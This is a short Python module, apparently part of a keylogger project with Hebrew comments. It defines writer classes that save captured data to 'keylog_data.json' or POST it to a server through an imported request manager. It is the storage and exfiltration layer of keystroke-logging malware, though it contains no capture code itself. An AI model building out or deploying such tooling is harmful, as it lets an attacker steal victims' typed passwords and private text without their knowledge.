import json
import os
from abc import ABC, abstractmethod
from api_server import RequestManager


class Writer(ABC):
    @abstractmethod
    def Writes(self, data: dict):
        pass


class FileWriter(Writer):
    def __init__(self, filename="keylog_data.json"):
        self.filename = filename

    def Writes(self, data: dict):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, "r", encoding="utf-8") as file:
                    existing_data = json.load(file)
                    if not existing_data:
                        existing_data = {}
            except (json.JSONDecodeError, FileNotFoundError):
                existing_data = {}
        else:
            existing_data = {}

        existing_data.update(data)

        """שמירת הנתונים לקובץ JSON"""
        with open(self.filename, "w", encoding="utf-8") as f:
            json.dump(existing_data, f, ensure_ascii=False, indent=4)

        return self.filename


class NetworkWriter(Writer):

    def __init__(self):
        self.app_server = RequestManager()

    def Writes(self, data: dict):
        """
        שליחת נתונים לשרת
        """
        self.app_server.handle_request(method = "POST",request_type="data",kwargs= data)
        print(f"Sending data to server")
        return data

class Write_keys:

    def __init__(self):
        self.fileWriter = FileWriter()
        self.networkWriter = NetworkWriter()

    def handle_write(self,write_to,data):
        if write_to == "json":
            self.fileWriter.Writes(data)
        elif write_to == "network":
            self.networkWriter.Writes(data)


